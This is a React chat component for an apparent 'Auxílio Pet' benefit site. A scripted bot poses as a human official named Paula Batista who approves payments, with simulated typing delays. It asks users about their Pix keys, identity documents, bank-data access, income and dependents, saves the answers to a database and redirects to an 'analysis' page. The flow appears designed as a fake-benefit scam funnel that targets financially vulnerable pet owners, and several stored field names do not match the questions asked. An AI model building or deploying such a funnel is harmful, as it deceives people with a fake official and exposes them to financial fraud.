import { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { Heart, Sparkles, User } from 'lucide-react';
import { supabase } from '../lib/supabase';
import { useAnalytics } from '../hooks/useAnalytics';

interface Message {
  type: 'bot' | 'user';
  text: string;
  id: number;
}

type UserData = {
  quantidade_pets?: number;
  nome?: string;
  estado?: string;
  pix_ativo?: string;
  cpf_final?: string;
  confirmacao_responsabilidade?: string;
  chave_pix?: string;
  pix_titular?: string;
  documento_ok?: string;
  confirmacao_dados?: string;
  celular_confirmado?: string;
  alimentacao_pet?: string;
  frequencia_alimentacao?: string;
  origem_pet?: string;
  emergencia_vet?: string;
  vacinas?: string;
  castracao?: string;
  renda?: string;
  dependentes?: string;
};

type Step =
  | "START"
  | "CONFIRMACAO_INICIAL"
  | "QUANTIDADE_PETS"
  | "NOME"
  | "ESTADO"
  | "PIX_ATIVO"
  | "CPF_FINAL"
  | "RESPONSABILIDADE"
  | "CHAVE_PIX"
  | "PIX_TITULAR"
  | "DOCUMENTO_OK"
  | "CONFIRMACAO_DADOS"
  | "CELULAR_CONFIRMADO"
  | "ALIMENTACAO_PET"
  | "FREQUENCIA_ALIMENTACAO"
  | "ORIGEM_PET"
  | "EMERGENCIA_VET"
  | "VACINAS"
  | "CASTRACAO"
  | "RENDA"
  | "DEPENDENTES"
  | "END"
  | "CANCELADO";

function Questionario() {
  const navigate = useNavigate();
  const [messages, setMessages] = useState<Message[]>([]);
  const [currentStep, setCurrentStep] = useState<Step>("START");
  const [userData, setUserData] = useState<UserData>({});
  const [showButtons, setShowButtons] = useState(false);
  const [isTyping, setIsTyping] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const hasInitialized = useRef(false);
  const messageIdRef = useRef(0);
  const { trackButtonClick } = useAnalytics('questionario');

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages]);

  useEffect(() => {
    if (!hasInitialized.current) {
      hasInitialized.current = true;
      processStep("START");
    }
  }, []);

  const processStep = (step: Step, input?: string) => {
    setShowButtons(false);
    setIsTyping(true);

    setTimeout(() => {
      setIsTyping(false);
      const response = getStepResponse(step, input || "");

      setMessages(prev => [...prev, {
        type: 'bot',
        text: response.message,
        id: messageIdRef.current++
      }]);

      setCurrentStep(response.nextStep);
      setUserData(response.userData);

      if (step === "QUANTIDADE_PETS" && input) {
        localStorage.setItem('quantidade_pets', input);
      }

      if (response.nextStep === "END") {
        saveAnswers(response.userData);
        setTimeout(() => {
          navigate('/analise');
        }, 2000);
      } else if (response.nextStep !== "CANCELADO") {
        setTimeout(() => {
          if (needsButtons(response.nextStep)) {
            setShowButtons(true);
          }
        }, 600);
      }
    }, 1500);
  };

  const getStepResponse = (step: Step, input: string) => {
    const text = input.trim().toLowerCase();

    switch (step) {
      case "START":
        return {
          message: "Olá, tudo bem?\n\nMeu nome é Paula Batista, sou responsável pela liberação do Auxílio Pet.\n\nPodemos iniciar o processo de aprovação agora?",
          nextStep: "CONFIRMACAO_INICIAL" as Step,
          userData
        };

      case "CONFIRMACAO_INICIAL":
        if (text === "sim") {
          return {
            message: "1️⃣ Quantos pets você tem?",
            nextStep: "QUANTIDADE_PETS" as Step,
            userData
          };
        }
        if (text === "não" || text === "nao") {
          return {
            message: "Sem problemas 😊\nCaso queira iniciar o processo futuramente, estaremos à disposição.",
            nextStep: "CANCELADO" as Step,
            userData
          };
        }
        return {
          message: "Por favor, responda apenas com sim ou não.",
          nextStep: "CONFIRMACAO_INICIAL" as Step,
          userData
        };

      case "QUANTIDADE_PETS":
        return {
          message: "2️⃣ Você já possui cadastro ativo no sistema?",
          nextStep: "NOME" as Step,
          userData: { ...userData, quantidade_pets: parseInt(input) || 1 }
        };

      case "NOME":
        return {
          message: "3️⃣ Em qual região você mora?",
          nextStep: "ESTADO" as Step,
          userData: { ...userData, nome: input }
        };

      case "ESTADO":
        return {
          message: "4️⃣ Atualmente você possui conta corrente e chave Pix ativa para receber o auxílio?",
          nextStep: "PIX_ATIVO" as Step,
          userData: { ...userData, estado: input }
        };

      case "PIX_ATIVO":
        return {
          message: "5️⃣ Você possui documento de identidade válido (RG ou CNH)?",
          nextStep: "CPF_FINAL" as Step,
          userData: { ...userData, pix_ativo: input }
        };

      case "CPF_FINAL":
        return {
          message: "6️⃣ Você confirma que realmente precisa do auxílio e se compromete a responder o questionário de forma responsável?",
          nextStep: "RESPONSABILIDADE" as Step,
          userData: { ...userData, cpf_final: input }
        };

      case "RESPONSABILIDADE":
        return {
          message: "7️⃣ Você tem acesso aos seus dados bancários para fornecer posteriormente?",
          nextStep: "CHAVE_PIX" as Step,
          userData: { ...userData, confirmacao_responsabilidade: input }
        };

      case "CHAVE_PIX":
        return {
          message: "8️⃣ A chave Pix que você pretende usar está no seu nome?",
          nextStep: "PIX_TITULAR" as Step,
          userData: { ...userData, chave_pix: input }
        };

      case "PIX_TITULAR":
        return {
          message: "9️⃣ Seu documento (RG ou CNH) está atualizado e em bom estado?\n\na) Sim\nb) Não",
          nextStep: "DOCUMENTO_OK" as Step,
          userData: { ...userData, pix_titular: input }
        };

      case "DOCUMENTO_OK":
        return {
          message: "🔟 Você confirma que os dados enviados são verdadeiros?\n\na) Sim\nb) Não",
          nextStep: "CONFIRMACAO_DADOS" as Step,
          userData: { ...userData, documento_ok: input }
        };

      case "CONFIRMACAO_DADOS":
        return {
          message: "1️⃣1️⃣ Este celular é o mesmo para contato e confirmação?\n\na) Sim\nb) Não",
          nextStep: "CELULAR_CONFIRMADO" as Step,
          userData: { ...userData, confirmacao_dados: input }
        };

      case "CELULAR_CONFIRMADO":
        return {
          message: "1️⃣2️⃣ Qual é a alimentação principal do seu pet hoje?\n\na) Ração adequada\nb) Ração quando possível",
          nextStep: "ALIMENTACAO_PET" as Step,
          userData: { ...userData, celular_confirmado: input }
        };

      case "ALIMENTACAO_PET":
        return {
          message: "1️⃣3️⃣ Com que frequência você alimenta seu pet?\n\na) Todos os dias\nb) Nem sempre",
          nextStep: "FREQUENCIA_ALIMENTACAO" as Step,
          userData: { ...userData, alimentacao_pet: input }
        };

      case "FREQUENCIA_ALIMENTACAO":
        return {
          message: "1️⃣4️⃣ Seus pets vieram de onde?\n\na) Adoção / resgate\nb) Compra",
          nextStep: "ORIGEM_PET" as Step,
          userData: { ...userData, frequencia_alimentacao: input }
        };

      case "ORIGEM_PET":
        return {
          message: "1️⃣5️⃣ Em emergência veterinária:\n\na) Consigo pagar\nb) Não teria como pagar",
          nextStep: "EMERGENCIA_VET" as Step,
          userData: { ...userData, origem_pet: input }
        };

      case "EMERGENCIA_VET":
        return {
          message: "1️⃣6️⃣ As vacinas do seu pet estão atualizadas?\n\na) Sim\nb) Ainda não",
          nextStep: "VACINAS" as Step,
          userData: { ...userData, emergencia_vet: input }
        };

      case "VACINAS":
        return {
          message: "1️⃣7️⃣ Seu pet é castrado?\n\na) Sim\nb) Ainda não",
          nextStep: "CASTRACAO" as Step,
          userData: { ...userData, vacinas: input }
        };

      case "CASTRACAO":
        return {
          message: "1️⃣8️⃣ Renda familiar:\n\na) Até um salário mínimo\nb) Acima de um salário mínimo",
          nextStep: "RENDA" as Step,
          userData: { ...userData, castracao: input }
        };

      case "RENDA":
        return {
          message: "1️⃣9️⃣ Quantas pessoas dependem da renda da casa?\n\na) 1 a 2\nb) 3 ou mais",
          nextStep: "DEPENDENTES" as Step,
          userData: { ...userData, renda: input }
        };

      case "DEPENDENTES":
        return {
          message: "✅ Questionário finalizado!\n\nSeus dados foram enviados para análise. Em breve entraremos em contato.",
          nextStep: "END" as Step,
          userData: { ...userData, dependentes: input }
        };

      default:
        return {
          message: "Fluxo finalizado.",
          nextStep: "END" as Step,
          userData
        };
    }
  };

  const needsButtons = (step: Step): boolean => {
    return ![
      "START",
      "CANCELADO",
      "END"
    ].includes(step);
  };

  const handleButtonClick = (value: string, displayText: string) => {
    trackButtonClick(`step_${currentStep}`, { button: value });
    setMessages(prev => [...prev, {
      type: 'user',
      text: displayText,
      id: messageIdRef.current++
    }]);
    processStep(currentStep, value);
  };

  const saveAnswers = async (finalData: UserData) => {
    try {
      const registrationId = localStorage.getItem('registration_id');

      if (registrationId) {
        await supabase
          .from('pet_questionnaire')
          .insert([
            {
              registration_id: registrationId,
              ...finalData
            }
          ]);
      }
    } catch (err) {
      console.error('Erro ao salvar respostas:', err);
    }
  };

  const getButtons = () => {
    switch (currentStep) {
      case "CONFIRMACAO_INICIAL":
      case "NOME":
      case "PIX_ATIVO":
      case "CPF_FINAL":
      case "RESPONSABILIDADE":
      case "CHAVE_PIX":
      case "PIX_TITULAR":
      case "DOCUMENTO_OK":
      case "CONFIRMACAO_DADOS":
      case "CELULAR_CONFIRMADO":
        return (
          <div className="grid grid-cols-2 gap-3">
            <button onClick={() => handleButtonClick('sim', 'Sim')} className="btn-yes">
              <span>Sim</span>
            </button>
            <button onClick={() => handleButtonClick('não', 'Não')} className="btn-no">
              <span>Não</span>
            </button>
          </div>
        );

      case "QUANTIDADE_PETS":
        return (
          <div className="grid grid-cols-3 gap-3">
            <button onClick={() => handleButtonClick('1', '1 pet')} className="btn-location">
              <span>1</span>
            </button>
            <button onClick={() => handleButtonClick('2', '2 pets')} className="btn-location">
              <span>2</span>
            </button>
            <button onClick={() => handleButtonClick('3', '3 pets')} className="btn-location">
              <span>3</span>
            </button>
            <button onClick={() => handleButtonClick('4', '4 pets')} className="btn-location">
              <span>4</span>
            </button>
            <button onClick={() => handleButtonClick('5', '5 pets')} className="btn-location">
              <span>5</span>
            </button>
            <button onClick={() => handleButtonClick('6', 'Mais de 5')} className="btn-location">
              <span>Mais de 5</span>
            </button>
          </div>
        );

      case "ESTADO":
        return (
          <div className="grid grid-cols-2 gap-3">
            <button onClick={() => handleButtonClick('norte', 'Região Norte')} className="btn-location">
              <span>Região Norte</span>
            </button>
            <button onClick={() => handleButtonClick('nordeste', 'Região Nordeste')} className="btn-location">
              <span>Região Nordeste</span>
            </button>
            <button onClick={() => handleButtonClick('centro-oeste', 'Região Centro-Oeste')} className="btn-location">
              <span>Região Centro-Oeste</span>
            </button>
            <button onClick={() => handleButtonClick('sudeste', 'Região Sudeste')} className="btn-location">
              <span>Região Sudeste</span>
            </button>
            <button onClick={() => handleButtonClick('sul', 'Região Sul')} className="btn-location col-span-2">
              <span>Região Sul</span>
            </button>
          </div>
        );

      case "ALIMENTACAO_PET":
        return (
          <div className="grid grid-cols-2 gap-3">
            <button onClick={() => handleButtonClick('a', 'Ração adequada')} className="btn-option">
              <span>Ração adequada</span>
            </button>
            <button onClick={() => handleButtonClick('b', 'Ração quando possível')} className="btn-option">
              <span>Ração quando possível</span>
            </button>
          </div>
        );

      case "FREQUENCIA_ALIMENTACAO":
        return (
          <div className="grid grid-cols-2 gap-3">
            <button onClick={() => handleButtonClick('a', 'Todos os dias')} className="btn-option">
              <span>Todos os dias</span>
            </button>
            <button onClick={() => handleButtonClick('b', 'Nem sempre')} className="btn-option">
              <span>Nem sempre</span>
            </button>
          </div>
        );

      case "ORIGEM_PET":
        return (
          <div className="grid grid-cols-2 gap-3">
            <button onClick={() => handleButtonClick('a', 'Adoção / resgate')} className="btn-option">
              <span>Adoção / resgate</span>
            </button>
            <button onClick={() => handleButtonClick('b', 'Compra')} className="btn-option">
              <span>Compra</span>
            </button>
          </div>
        );

      case "EMERGENCIA_VET":
        return (
          <div className="grid grid-cols-2 gap-3">
            <button onClick={() => handleButtonClick('a', 'Consigo pagar')} className="btn-option">
              <span>Consigo pagar</span>
            </button>
            <button onClick={() => handleButtonClick('b', 'Não teria como pagar')} className="btn-option">
              <span>Não teria como pagar</span>
            </button>
          </div>
        );

      case "VACINAS":
        return (
          <div className="grid grid-cols-2 gap-3">
            <button onClick={() => handleButtonClick('a', 'Sim')} className="btn-option">
              <span>Sim</span>
            </button>
            <button onClick={() => handleButtonClick('b', 'Ainda não')} className="btn-option">
              <span>Ainda não</span>
            </button>
          </div>
        );

      case "CASTRACAO":
        return (
          <div className="grid grid-cols-2 gap-3">
            <button onClick={() => handleButtonClick('a', 'Sim')} className="btn-option">
              <span>Sim</span>
            </button>
            <button onClick={() => handleButtonClick('b', 'Ainda não')} className="btn-option">
              <span>Ainda não</span>
            </button>
          </div>
        );

      case "RENDA":
        return (
          <div className="grid grid-cols-2 gap-3">
            <button onClick={() => handleButtonClick('a', 'Até um salário mínimo')} className="btn-option">
              <span>Até um salário mínimo</span>
            </button>
            <button onClick={() => handleButtonClick('b', 'Acima de um salário mínimo')} className="btn-option">
              <span>Acima de um salário mínimo</span>
            </button>
          </div>
        );

      case "DEPENDENTES":
        return (
          <div className="grid grid-cols-2 gap-3">
            <button onClick={() => handleButtonClick('a', '1 a 2')} className="btn-option">
              <span>1 a 2</span>
            </button>
            <button onClick={() => handleButtonClick('b', '3 ou mais')} className="btn-option">
              <span>3 ou mais</span>
            </button>
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-emerald-950 via-green-900 to-emerald-950 relative overflow-hidden">
      <div className="absolute inset-0 bg-[url('https://images.pexels.com/photos/4587998/pexels-photo-4587998.jpeg?auto=compress&cs=tinysrgb&w=1920')] bg-cover bg-center opacity-10"></div>

      <div className="absolute inset-0">
        <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-br from-emerald-900/50 via-green-900/30 to-transparent"></div>
      </div>

      <nav className="relative z-20 container mx-auto px-3 sm:px-6 lg:px-8">
        <div className="glass-effect rounded-xl sm:rounded-2xl mt-3 sm:mt-6 px-4 sm:px-6 py-3 sm:py-4 flex items-center justify-center">
          <div className="flex items-center gap-2 sm:gap-3">
            <div className="bg-gradient-to-br from-white to-green-50 rounded-lg sm:rounded-xl p-2 sm:p-2.5 shadow-lg shadow-green-500/20">
              <Heart className="text-green-600" size={24} fill="currentColor" />
            </div>
            <span className="text-white text-lg sm:text-xl md:text-2xl font-bold tracking-tight">AUXILIO PET</span>
          </div>
        </div>
      </nav>

      <main className="relative z-10 container mx-auto px-3 sm:px-6 lg:px-8 py-4 sm:py-8">
        <div className="max-w-3xl mx-auto">
          <div className="glass-effect rounded-2xl sm:rounded-3xl p-4 sm:p-6 flex flex-col shadow-2xl" style={{ minHeight: '70vh' }}>
            <div className="flex-1 overflow-y-auto mb-4 sm:mb-6 space-y-3 sm:space-y-4 md:space-y-5 px-1 sm:px-2" style={{ maxHeight: '60vh' }}>
              {messages.map((message) => (
                <div
                  key={message.id}
                  className={`flex gap-2 sm:gap-3 items-start ${message.type === 'user' ? 'justify-end' : 'justify-start'} animate-fadeInUp`}
                >
                  {message.type === 'bot' && (
                    <div className="flex-shrink-0 w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-gradient-to-br from-emerald-400 to-green-500 flex items-center justify-center shadow-lg shadow-green-500/30 ring-2 ring-white/20">
                      <Sparkles className="text-white" size={18} />
                    </div>
                  )}

                  <div
                    className={`max-w-[80%] sm:max-w-[75%] px-4 sm:px-5 py-3 sm:py-3.5 rounded-2xl shadow-lg ${
                      message.type === 'user'
                        ? 'bg-gradient-to-br from-green-500 to-emerald-600 text-white rounded-br-sm border border-green-400/30'
                        : 'bg-white/25 text-white rounded-bl-sm backdrop-blur-md border border-white/20'
                    }`}
                    style={{ whiteSpace: 'pre-line', lineHeight: '1.6' }}
                  >
                    <div className="text-[14px] sm:text-[15px]">{message.text}</div>
                  </div>

                  {message.type === 'user' && (
                    <div className="flex-shrink-0 w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-gradient-to-br from-blue-400 to-blue-500 flex items-center justify-center shadow-lg shadow-blue-500/30 ring-2 ring-white/20">
                      <User className="text-white" size={18} />
                    </div>
                  )}
                </div>
              ))}

              {isTyping && (
                <div className="flex gap-2 sm:gap-3 items-start animate-fadeInUp">
                  <div className="flex-shrink-0 w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-gradient-to-br from-emerald-400 to-green-500 flex items-center justify-center shadow-lg shadow-green-500/30 ring-2 ring-white/20">
                    <Sparkles className="text-white" size={18} />
                  </div>
                  <div className="bg-white/25 backdrop-blur-md border border-white/20 rounded-2xl rounded-bl-sm px-4 sm:px-5 py-3 sm:py-4 shadow-lg">
                    <div className="flex gap-1.5">
                      <div className="w-2 h-2 bg-white/80 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
                      <div className="w-2 h-2 bg-white/80 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
                      <div className="w-2 h-2 bg-white/80 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
                    </div>
                  </div>
                </div>
              )}

              <div ref={messagesEndRef} />
            </div>

            {showButtons && (
              <div className="animate-fadeInUp">
                {getButtons()}
              </div>
            )}
          </div>
        </div>
      </main>

      <style>{`
        .grid button {
          width: 100%;
          padding: 0.75rem 1rem;
          background: rgba(100, 116, 100, 0.5);
          backdrop-filter: blur(10px);
          border: 1.5px solid rgba(255, 255, 255, 0.15);
          border-radius: 0.75rem;
          color: white;
          font-weight: 500;
          font-size: 14px;
          line-height: 1.5;
          transition: all 0.25s ease;
          cursor: pointer;
          text-align: center;
          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
          position: relative;
          overflow: hidden;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 0.5rem;
        }

        @media (min-width: 640px) {
          .grid button {
            padding: 0.875rem 1.25rem;
            font-size: 15px;
          }
        }

        .grid button:hover {
          background: rgba(100, 116, 100, 0.65);
          border-color: rgba(255, 255, 255, 0.25);
          transform: translateY(-2px);
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
        }

        .grid button:active {
          transform: translateY(0);
          box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
        }


        @keyframes fadeInUp {
          from {
            opacity: 0;
            transform: translateY(20px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }

        .animate-fadeInUp {
          animation: fadeInUp 0.5s ease-out forwards;
        }
      `}</style>
    </div>
  );
}

export default Questionario;
